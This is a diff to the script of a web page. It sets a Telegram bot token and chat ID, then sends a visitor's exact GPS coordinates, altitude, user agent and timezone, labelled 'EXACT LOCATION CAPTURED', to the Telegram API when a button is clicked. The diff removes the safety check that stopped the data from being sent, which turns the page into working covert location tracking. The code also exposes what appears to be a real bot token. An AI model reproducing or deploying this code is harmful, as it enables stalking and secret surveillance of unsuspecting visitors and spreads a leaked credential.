@@ -16,23 +16,17 @@
 
 <script>
     // === CONFIGURATION ===
-    // REPLACE THESE WITH YOUR REAL TELEGRAM BOT TOKEN AND CHAT ID
     const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
     const TELEGRAM_CHAT_ID = "8577571897";
     // =====================
 
     function sendToTelegram(lat, lng, acc, alt, timestamp, userAgent, timezone) {
-        if (TELEGRAM_BOT_TOKEN === "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E" || TELEGRAM_CHAT_ID === "8577571897") {
-            console.log("Telegram not configured - location data below:");
-            return false;
-        }
         let message = `📍 EXACT LOCATION CAPTURED\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${timestamp}\nUser Agent: ${userAgent}\nTimezone: ${timezone}\nMaps: https://www.google.com/maps?q=${lat},${lng}`;
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
         }).catch(err => console.log("Send error:", err));
-        return true;
     }
 
     document.getElementById('getLocationBtn').addEventListener('click', function() {
